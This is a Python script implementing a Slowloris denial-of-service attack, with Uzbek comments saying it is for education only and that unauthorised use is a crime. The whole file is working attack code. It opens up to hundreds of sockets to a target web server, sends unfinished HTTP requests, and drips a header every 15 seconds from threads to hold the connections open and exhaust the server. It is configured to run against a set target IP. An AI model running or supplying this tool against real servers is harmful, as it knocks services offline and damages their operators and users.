#!/usr/bin/env python3
"""
Slowloris - FAQAT TA'LM UCHUN!
Faqat o'z tarmog'ingizda sinang!
Ruxsatsiz ishlatish JINOYAT!
"""

import socket
import time
import threading

class Slowloris:
    """
    Slowloris hujumi - sekin HTTP connection
    
    ⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!
    """
    
    def __init__(self, target, port=80, num_sockets=200):
        self.target = target
        self.port = port
        self.num_sockets = num_sockets
        self.sockets = []
        self.running = False
    
    def create_socket(self):
        """Yangi socket ochish (requestni tugatmaslik)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            
            # HTTP request boshlash, lekin tugatmaslik
            request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n"
            sock.send(request.encode())
            
            self.sockets.append(sock)
            return True
        except:
            return False
    
    def keep_alive(self, sock):
        """Socket ni jonli saqlash - sekin header qo'shish"""
        while self.running:
            try:
                # 15 sekundda bir header qo'shish
                sock.send(f"X-a: {int(time.time())}\r\n".encode())
                time.sleep(15)
            except:
                break
    
    def start(self):
        """Hujumni boshlash"""
        self.running = True
        
        print(f"⚠️  Slowloris: {self.target}:{self.port}")
        print(f"[*] {self.num_sockets} socket yaratilmoqda...")
        
        # Socketlar yaratish
        for i in range(self.num_sockets):
            if self.create_socket():
                if (i + 1) % 50 == 0:
                    print(f"[*] {i + 1}/{self.num_sockets}")
            time.sleep(0.1)
        
        print(f"[*] {len(self.sockets)} socket tayyor")
        print("[*] Keep-alive boshlandi (CTRL+C to'xtatish)")
        
        # Keep-alive threads
        for sock in self.sockets:
            t = threading.Thread(target=self.keep_alive, args=(sock,))
            t.daemon = True
            t.start()
        
        # Kutish
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Hujumni to'xtatish va socketlarni yopish"""
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        print(f"[*] To'xtatildi: {len(self.sockets)} socket yopildi")

if __name__ == "__main__":
    # ⚠️  FAQAT O'Z TARMOG'INGIZNI ISHLATING!
    TARGET = "192.168.1.100"  # Target server IP
    PORT = 80                 # HTTP port
    SOCKETS = 100             # Socket soni
    
    slowloris = Slowloris(TARGET, PORT, SOCKETS)
    slowloris.start()
